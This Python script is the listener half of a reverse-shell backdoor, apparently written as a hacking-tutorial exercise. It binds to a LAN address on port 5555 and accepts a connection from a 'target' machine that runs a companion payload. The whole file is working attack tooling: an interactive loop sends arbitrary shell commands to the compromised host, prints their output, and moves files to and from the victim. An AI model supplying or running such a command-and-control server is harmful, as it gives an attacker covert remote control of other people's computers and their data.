# writing one server and other payload file to communicate 

import socket # allows to establish internet connection between 2 machines
import json # to send the data
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        
def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())   
        
def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    
def target_communication():
    while True:
        command = input('* Shell~%s : ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ': 
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET tells the connection is to be over IPv4 and SOCK_STREAM tells that the connection will be TCP
sock.bind(('192.168.156.86', 5555)) # binds IP and port
print('[+] Listening for the incoming connections')
sock.listen(5) # listen upto 5 different connections
target, ip = sock.accept() # accepts and stores result in these 2 var
print('[+] Target connected from : '+ str(ip))
target_communication()